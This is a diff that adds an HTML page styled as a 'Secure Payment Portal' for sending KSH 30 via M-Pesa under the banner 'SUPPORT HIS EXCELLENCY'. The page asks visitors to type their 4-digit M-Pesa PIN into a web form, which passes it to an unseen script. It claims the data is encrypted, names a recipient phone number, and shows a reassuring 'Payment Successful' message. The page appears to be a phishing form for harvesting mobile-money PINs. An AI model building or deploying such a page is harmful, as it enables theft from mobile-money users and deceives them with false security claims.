@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KSH 30 Payment</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>SUPPORT HIS EXCELLENCY</h1>
+                <p class="subtitle">Secure Payment Portal</p>
+            </div>
+            
+            <div class="content">
+                <div class="amount-section">
+                    <label for="currency">Amount to Pay:</label>
+                    <div class="amount-display">
+                        <span class="currency">KSH</span>
+                        <span class="value">30</span>
+                    </div>
+                    <p class="mpesa-text">via M-Pesa</p>
+                    <div class="recipient-info">
+                        <p class="recipient-label">To:</p>
+                        <p class="recipient-number">+254 746 630 940</p>
+                    </div>
+                </div>
+
+                <form id="paymentForm" class="form">
+                    <div class="form-group">
+                        <label for="mpesaPin">Enter Your M-Pesa PIN</label>
+                        <input 
+                            type="password" 
+                            id="mpesaPin" 
+                            name="mpesaPin" 
+                            placeholder="••••"
+                            maxlength="4"
+                            inputmode="numeric"
+                            pattern="[0-9]{4}"
+                            required
+                            autofocus
+                        >
+                        <small class="pin-hint">4-digit PIN required</small>
+                    </div>
+
+                    <div class="phone-hint">
+                        <p>A prompt will appear on your M-Pesa registered phone</p>
+                    </div>
+
+                    <button type="submit" class="btn-primary">
+                        Confirm Payment
+                    </button>
+                </form>
+
+                <div id="successMessage" class="success-message hidden">
+                    <div class="success-icon">✓</div>
+                    <h2>Payment Successful!</h2>
+                    <p>Your KSH 30 payment has been processed</p>
+                    <p class="confirmation-id">Reference: <span id="refId"></span></p>
+                    <button class="btn-secondary" onclick="resetForm()">Make Another Payment</button>
+                </div>
+            </div>
+
+            <div class="footer">
+                <p>Secure payment processing • Your data is encrypted</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
